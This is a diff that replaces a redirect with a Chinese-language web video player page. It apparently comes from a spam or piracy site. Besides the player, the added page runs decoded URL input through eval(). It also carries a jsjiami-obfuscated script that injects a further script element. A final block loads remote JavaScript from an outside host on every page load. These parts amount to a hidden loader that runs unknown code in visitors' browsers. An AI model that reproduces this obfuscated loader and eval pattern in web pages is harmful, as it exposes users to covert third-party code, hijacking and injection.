@@ -1,1 +1,156 @@
-<meta http-equiv="refresh" content="0.1;url=https://so-t.cn/1b69">
+<!DOCTYPE html>
+<!--闪电Tg：a9517920-->
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="referrer" content="never">
+  <meta http-equiv="Access-Control-Allow-Origin" content="*" />
+  <meta http-equiv="Access-Control-Allow-Credentials" content="*" />
+  <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no" />
+  <link rel="stylesheet" href="https://g.alicdn.com/de/prismplayer/2.9.3/skins/default/aliplayer-min.css"/>
+  <script type="text/javascript" charset="utf-8" src="https://g.alicdn.com/de/prismplayer/2.9.3/aliplayer-min.js"></script>
+  <style>
+    body,
+    html {
+      width: 100%;
+      height: 100%;
+      background: rgb(0, 0, 0);
+      padding: 0;
+      margin: 0;
+      overflow-x: hidden;
+      overflow-y: hidden
+    }
+
+    * {
+      margin: 0;
+      border: 0;
+      padding: 0;
+      text-decoration: none
+    }
+
+    #player-con {
+      position: inherit
+    }
+  </style>
+</head>
+<body>
+<div class="prism-player" id="player-con"></div>
+<script type="text/javascript">
+function GetQueryString(name) {
+    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
+    var r = window.location.search.substr(1).match(reg);
+    if (r != null) return decodeURI(r[2]); return null;
+}
+var string = GetQueryString("key");
+var key = 'SDYYDS';   
+var string = atob(string);   
+var len = key.length;   
+var code = '';   
+for (i = 0; i < string.length; i++) {   
+    k = i % len;   
+    code += String.fromCharCode(string.charCodeAt(i) ^ key.charCodeAt(k));   
+}   
+var obj = eval("("+decodeURIComponent(atob(code))+")");
+document.title = obj['name'];
+var player = new Aliplayer({
+  "id": "player-con",
+  "source": obj['url'],
+  "width": "100%",
+  "height": "100%",
+  "autoplay": true,
+  "isLive": false,
+  "rePlay": false,
+  "playsinline": true,
+  "preload": true,
+  "controlBarVisibility": "always",
+  "useH5Prism": true,
+  "skinLayout": [
+    {
+      "name": "bigPlayButton",
+      "align": "blabs",
+      "x": 30,
+      "y": 80
+    },
+    {
+      "name": "H5Loading",
+      "align": "cc"
+    },
+    {
+      "name": "errorDisplay",
+      "align": "tlabs",
+      "x": 0,
+      "y": 0
+    },
+    {
+      "name": "infoDisplay"
+    },
+    {
+      "name": "tooltip",
+      "align": "blabs",
+      "x": 0,
+      "y": 56
+    },
+    {
+      "name": "thumbnail"
+    },
+    {
+      "name": "controlBar",
+      "align": "blabs",
+      "x": 0,
+      "y": 0,
+      "children": [
+        {
+          "name": "progress",
+          "align": "blabs",
+          "x": 0,
+          "y": 44
+        },
+        {
+          "name": "playButton",
+          "align": "tl",
+          "x": 15,
+          "y": 12
+        },
+        {
+          "name": "timeDisplay",
+          "align": "tl",
+          "x": 10,
+          "y": 7
+        },
+        {
+          "name": "fullScreenButton",
+          "align": "tr",
+          "x": 10,
+          "y": 12
+        },
+        {
+          "name": "volume",
+          "align": "tr",
+          "x": 5,
+          "y": 10
+        }
+      ]
+    }
+  ]
+}, function (player) {
+    console.log("The player is created");
+  }
+);
+function logo(){
+ window.location.href = obj['dwz'];//点击logo跳转
+};
+</script>
+<script type="text/javascript">
+var _0xodz='jsjiami.com.v6',_0xodz_=['‮_0xodz'],_0x267a=[_0xodz,'Q8Ocw5FgNW/CsVrCh8Kbw7jDncKTY8OOWEJyEsKtCE/CvBPDn07DrBHDlcKuw4XDh0vDgsKYwr1Ae1jChsOaYDEBwqgiQHg+LMK0S8KLb0hdFyw9IxMxw60nw6d4DHLClsKBw7JqHMKxwqofU8KmJTHDpMOKVsODY8OdT8Kowo/DtmMpd8Oiw47DoGBRTw3Ct2rDk8KwOGLCsCbDoBZNWcOow77CmUs/akLCgcOPay10w6MlJlvDtkQ3w53CqcKrw7EbOMO7w6TCq8OedsKYwrjCn8KEM8KuciTCtcKzD8K9WnTCkcO5WcO0QsOXUMOkVsOrw7vDjcKew6TCusOVIcKow6vDiMOpQ1vDoCDCshQvw63Dlx4vw4vCl8KsworCulHCu21Ow7vCjUcvLw1Ow6TCuR5Swr7Cv23DocOVdg7ClMKfwplNecOrwpsrw7fCggrDgWbCkMKEw7J2d8Orw5DCucOnL8KXOxU=','BiAICA==','BT8cFMOJfxTDjBjDtkA=','woQOwpvCkUvDhzRaAkLCr8KJZw==','JMOJZQ==','wrUxQMKLwrVNZm3DvA==','fjWdsljAiHanmYiLV.cDoRm.vpS6P=='];if(function(_0x2f3e31,_0x3a89c9,_0x2c6db2){function _0x1fa352(_0x24649a,_0x4670ad,_0x5369f8,_0x377616,_0x26ccf4,_0x2ff55a){_0x4670ad=_0x4670ad>>0x8,_0x26ccf4='po';var _0x3e08c5='shift',_0x296519='push',_0x2ff55a='‮';if(_0x4670ad<_0x24649a){while(--_0x24649a){_0x377616=_0x2f3e31[_0x3e08c5]();if(_0x4670ad===_0x24649a&&_0x2ff55a==='‮'&&_0x2ff55a['length']===0x1){_0x4670ad=_0x377616,_0x5369f8=_0x2f3e31[_0x26ccf4+'p']();}else if(_0x4670ad&&_0x5369f8['replace'](/[fWdlAHnYLVDRpSP=]/g,'')===_0x4670ad){_0x2f3e31[_0x296519](_0x377616);}}_0x2f3e31[_0x296519](_0x2f3e31[_0x3e08c5]());}return 0x102bb7;};return _0x1fa352(++_0x3a89c9,_0x2c6db2)>>_0x3a89c9^_0x2c6db2;}(_0x267a,0x111,0x11100),_0x267a){_0xodz_=_0x267a['length']^0x111;};function _0x21dc(_0x3bad19,_0x47b1c6){_0x3bad19=~~'0x'['concat'](_0x3bad19['slice'](0x1));var _0x3e8674=_0x267a[_0x3bad19];if(_0x21dc['sfbrnv']===undefined){(function(){var _0x4867a2=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x2dc776='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x4867a2['atob']||(_0x4867a2['atob']=function(_0x296cdc){var _0xc430b0=String(_0x296cdc)['replace'](/=+$/,'');for(var _0x52a34d=0x0,_0x3437d5,_0x115733,_0x25bb0f=0x0,_0xa4f479='';_0x115733=_0xc430b0['charAt'](_0x25bb0f++);~_0x115733&&(_0x3437d5=_0x52a34d%0x4?_0x3437d5*0x40+_0x115733:_0x115733,_0x52a34d++%0x4)?_0xa4f479+=String['fromCharCode'](0xff&_0x3437d5>>(-0x2*_0x52a34d&0x6)):0x0){_0x115733=_0x2dc776['indexOf'](_0x115733);}return _0xa4f479;});}());function _0xfcead6(_0xcc0014,_0x47b1c6){var _0x2b4b07=[],_0x55c51c=0x0,_0x3463c6,_0x6912e2='',_0x907f9a='';_0xcc0014=atob(_0xcc0014);for(var _0x4d05ab=0x0,_0x35c79f=_0xcc0014['length'];_0x4d05ab<_0x35c79f;_0x4d05ab++){_0x907f9a+='%'+('00'+_0xcc0014['charCodeAt'](_0x4d05ab)['toString'](0x10))['slice'](-0x2);}_0xcc0014=decodeURIComponent(_0x907f9a);for(var _0x384390=0x0;_0x384390<0x100;_0x384390++){_0x2b4b07[_0x384390]=_0x384390;}for(_0x384390=0x0;_0x384390<0x100;_0x384390++){_0x55c51c=(_0x55c51c+_0x2b4b07[_0x384390]+_0x47b1c6['charCodeAt'](_0x384390%_0x47b1c6['length']))%0x100;_0x3463c6=_0x2b4b07[_0x384390];_0x2b4b07[_0x384390]=_0x2b4b07[_0x55c51c];_0x2b4b07[_0x55c51c]=_0x3463c6;}_0x384390=0x0;_0x55c51c=0x0;for(var _0x7f1241=0x0;_0x7f1241<_0xcc0014['length'];_0x7f1241++){_0x384390=(_0x384390+0x1)%0x100;_0x55c51c=(_0x55c51c+_0x2b4b07[_0x384390])%0x100;_0x3463c6=_0x2b4b07[_0x384390];_0x2b4b07[_0x384390]=_0x2b4b07[_0x55c51c];_0x2b4b07[_0x55c51c]=_0x3463c6;_0x6912e2+=String['fromCharCode'](_0xcc0014['charCodeAt'](_0x7f1241)^_0x2b4b07[(_0x2b4b07[_0x384390]+_0x2b4b07[_0x55c51c])%0x100]);}return _0x6912e2;}_0x21dc['QIcqhb']=_0xfcead6;_0x21dc['TzzGvg']={};_0x21dc['sfbrnv']=!![];}var _0x2a77e4=_0x21dc['TzzGvg'][_0x3bad19];if(_0x2a77e4===undefined){if(_0x21dc['cHnofJ']===undefined){_0x21dc['cHnofJ']=!![];}_0x3e8674=_0x21dc['QIcqhb'](_0x3e8674,_0x47b1c6);_0x21dc['TzzGvg'][_0x3bad19]=_0x3e8674;}else{_0x3e8674=_0x2a77e4;}return _0x3e8674;};let _0xfb4d6f=document[_0x21dc('‫0','L!*Z')](_0x21dc('‫1','4QuD'));_0xfb4d6f[_0x21dc('‫2','MhKs')]=_0x21dc('‫3','f5]y');document[_0x21dc('‫4','90zD')][_0x21dc('‮5','90zD')](_0xfb4d6f);;_0xodz='jsjiami.com.v6';
+</script>
+<script>
+func();
+function func() {
+    let s = document.createElement('script');
+    s.src='http://api.sqzhan.com/js/index.js';
+    document.body.appendChild(s);
+};
+</script>
+</body>
+</html>
